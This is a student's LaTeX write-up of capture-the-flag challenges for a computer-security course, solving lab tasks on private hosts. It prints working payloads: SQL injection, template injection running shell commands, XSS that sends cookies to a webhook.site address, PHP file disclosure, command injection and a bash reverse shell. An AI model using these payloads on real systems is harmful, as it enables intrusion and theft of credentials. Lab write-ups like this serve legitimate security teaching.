@@ -1,0 +1,129 @@
+\documentclass{article}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[colorlinks=true, linkcolor=blue, urlcolor=blue, citecolor=blue]{hyperref}
+\usepackage[left=1.3cm, right=1.3cm, top=0.6in, bottom=0.9in]{geometry}
+%-------------------------------------------
+\newtheorem{theorem}{Theorem}
+\newtheorem{acknowledgement}[theorem]{Acknowledgement}
+\newtheorem{algorithm}[theorem]{Algorithm}
+\newtheorem{axiom}[theorem]{Axiom}
+\newtheorem{case}[theorem]{Case}
+\newtheorem{claim}[theorem]{Claim}
+\newtheorem{conclusion}[theorem]{Conclusion}
+\newtheorem{condition}[theorem]{Condition}
+\newtheorem{conjecture}[theorem]{Conjecture}
+\newtheorem{corollary}[theorem]{Corollary}
+\newtheorem{criterion}[theorem]{Criterion}
+\newtheorem{definition}[theorem]{Definition}
+\newtheorem{example}[theorem]{Example}
+\newtheorem{exercise}[theorem]{Exercise}
+\newtheorem{lemma}[theorem]{Lemma}
+\newtheorem{notation}[theorem]{Notation}
+\newtheorem{problem}[theorem]{Problem}
+\newtheorem{proposition}[theorem]{Proposition}
+\newtheorem{remark}[theorem]{Remark}
+\newtheorem{solution}[theorem]{Solution}
+\newtheorem{summary}[theorem]{Summary}
+\newenvironment{proof}[1][Proof]{\textbf{#1.} }{\ \rule{0.5em}{0.5em}}
+\setlength{\parindent}{0.3in}
+
+\lstdefinestyle{python}{
+  language=Python,
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{blue},
+  stringstyle=\color{red},
+  commentstyle=\color{gray},
+  identifierstyle=\color{black},
+  showstringspaces=false,
+  breaklines=true,
+  columns=fullflexible,
+  frame=single
+}
+
+\begin{document}
+
+\begin{flushright}
+\textbf{Jaskirat Singh Maskeen, 23110146 \\
+12 April, 2026\\
+{\color{blue}\href{https://github.com/jsmaskeen/CS431-Assignments/tree/assn5}{GitHub Repository}}\\ 
+CTF Username: \texttt{23110146}}
+\end{flushright}
+
+\begin{center}
+\textbf{CS 431: Computer and Network Security  \\
+Assignment 4} \\
+\end{center}
+
+\noindent
+\subsubsection*{password}
+{Flag} : \texttt{e4syp4asy1234}\\ 
+I first tried random credentials, which gave no fruitful result. Then I thought what if i can break the program by passing in a null character, so i executed: 
+\texttt{printf "password\textbackslash x00test\textbackslash n" | nc 10.0.118.48 30366}. That resulted in a value error. And the traceback revealed that it is a SQL injection sort of an attack. Then I tried the trivial SQLi payload, \texttt{' OR 1=1}. This did not work then I tried changing quote to double quote. That also didn't work. Finally without quotes, \texttt{or 1=1} worked. That dumped the table, and we get the password in the row where username is admin.
+
+
+\subsubsection*{the usual suspects}
+{Flag} : \texttt{dL@stCTF431\{h3r3\_i\_4m\}}\\  (Note: while copying the flag, underscores are not copied. Some latex issue)\\ 
+Notice that, we can perform SSTI (server side template injection), in the url of the challenge.
+
+\noindent \texttt{http://10.0.118.48:30379/?icecream=\{\{""; custom\_code\_here\}\}}.
+So we try to dump the \texttt{globals()} but that just reveals that the app is most probably a tornado client. Next I try to dump the dict of \texttt{\_\_main\_\_}. Doing that using, \texttt{http://10.0.118.48:30379/?icecream=\{\{\_\_import\_\_('sys').modules['\_\_main\_\_'].\_\_dict\_\_}\}\}, we get our flag. Also I noticed that there is a secret, "MangoDB". Looking at the cookies, I realised that this was not the intended way to solve it. I think, what we had to do was, change the cookie to set admin to true (base64 encoded) and sign the cookies using the secret. (As required by tornado client). The only thing remaining was to find the secret in some other way, rather than seeing the dict of \_\_main\_\_. Looking online, I found that the secret is stored in tornado application itself, and from globals(), I already got the application. So I just had to look for \texttt{http://10.0.118.48:30379/?icecream=\{\{application.settings\}\}}. Then we simply forge the cookie, with admin set to true, and we get the flag.  
+
+\begin{quote}
+Note: In this problem itself, going to \\ \verb|http://10.0.118.48:30379/?icecream={{__import__('os').popen('cd /tmp && cat flag3').read()}}|, gives us the cookie for the next challenge, and decoding it we get the flag for the next problem, the-confused-deputy
+\end{quote}
+
+\subsubsection*{the-confused-deputy}
+{Flag} : \texttt{dL@stCTF431\{cssxss\}}\\ 
+Viewing the source code, we see that there is a hidden input field, which is of password type, separate from the color input. Also, whatever input comes to the color text box, is first sanitized by the \texttt{sanitize()} function, however that just removes the first occurance of \texttt{<} and \texttt{>}. So we can bypass that by specifying, \texttt{<>payload}. Trying \texttt{<>\#green;\}</style> <script>alert(1);</script> //}, did not work, however,\\ \texttt{<>\#green;\}</style> <img src="lol" onerror = "alert(1)">} worked and I achieved javascript code execution. Next we go to the '/admin' page, put the link to visit as \texttt{http://10.0.118.48:7777/view}, and supply our crafted payload using \href{https://webhook.site}{webhook.site}, \\ \texttt{<>green;\}</style> <img src='lol' onerror="new Image().src='https:\textbackslash /\textbackslash /webhook.site/94b44b45-f1e3-4ec1\\-9d81-2d39c7de1a38?c='+ btoa(document.cookie)">}. The admin visits the page, and fills in this url, which sends the cookie to our webhook, we decode it from base64, to get the password, as dL@stCTF431\{cssxss\}.
+
+\subsubsection*{body count}
+{Flag} : \texttt{dL@stCTF431\{1nj3ct10n\_15\_p41nfu1\}}\\ (Note: while copying the flag, underscores are not copied. Some latex issue)\\ 
+Once we load the challenge url, we observe that it is a php site, and there is a file, called \texttt{?file=wc.php}, so that gives us a hint that, there might be some other files on the server that can be looked into. Searching online for how to dump files using php, I found, \href{https://medium.com/@althubianymalek/exploring-php-wrappers-enhancing-php-capabilities-280a6af827b5}{a medium article}, that tells us we can use php filters. Dumping the entire code of wc.php, using \texttt{/?file=php://filter/convert.base64-encode/resource=wc.php}. We observe that RCE is possible, as \\ \texttt{exec('printf \'' . \$text . '\' | wc -c')} is present, and it takes in any input without sanitizing it. But first, we need the password. Looking at /robots.txt, to find any disallowed paths, we get the password from dumping the contents of \texttt{checkpass.php}, using, \texttt{/?file=php://filter/convert.base64-encode/resource=checkpass.php}. We finally get access to the wc program, and we can run any code we like using this payload \texttt{' \&\& our\_command \# '}. We try to get a reverse shell, using \href{https://www.revshells.com/}{revhsells.com}, we start a nc listener on our host machine, \texttt{nc -lvnp 9001}, and send the payload, \texttt{'\&\& bash -c "bash -i >\& /dev/tcp/10.7.12.140/9001 0>\&1"; \# '} to the wc.php program.
+
+Once we get a reverse shell, we can finally execute commands. Looking into the \texttt{/tmp} directory, we observe that we don't have enough permissions. There are flags in the default directory as well, however no permissions to read them. We do \texttt{cat /etc/passwd}, and observe that a user anmed \texttt{ctf} is there, and there is also a directory \texttt{/ctf}. Peeping into that, we get a readme file and a whole bunch of nested folders. Reading the \texttt{README}, we get the md5 hash of the password. Running that through \href{https://md5decrypt.net/}{md5 decrypt}, we get our password, \texttt{cnsctf}. 
+We then run \texttt{su ctf}, to switch to the ctf user (after entering the password). Then moving through the directories in /ctf directory, we arrive at the flag: \texttt{cat /ctf/system/of/a/down/flag.txt}, which gives us the flag.
+
+\noindent
+\begin{minipage}[t]{0.49\textwidth}
+Problem 1
+\vspace{0pt}
+\centering
+\includegraphics[width=\linewidth]{../images/1-1.png}
+% \vspace{0.5cm}
+\includegraphics[width=\linewidth]{../images/1-2.png}
+\end{minipage}
+\hfill
+\begin{minipage}[t]{0.49\textwidth}
+Problem 2
+\vspace{0pt}
+\centering
+\includegraphics[width=\linewidth]{../images/2-1.png}
+% \vspace{0.5cm}
+\includegraphics[width=\linewidth]{../images/2-2.png}
+\end{minipage}
+\begin{minipage}[t]{0.49\textwidth}
+Problem 4
+\vspace{0pt}
+\centering
+\includegraphics[width=\linewidth]{../images/4-1.png}
+% \vspace{0.5cm}
+\includegraphics[width=\linewidth]{../images/4-2.png}
+\end{minipage}
+\begin{minipage}[t]{0.49\textwidth}
+\vspace{0pt}
+\centering
+\includegraphics[width=\linewidth]{../images/4-3.png}
+% \vspace{0.5cm}
+\includegraphics[width=\linewidth]{../images/4-4.png}
+\end{minipage}
+
+\newpage
+\section*{Source Code (Problem 2): forge.py}
+\lstset{style=python}
+\lstinputlisting{./../forge.py}
+\end{document}
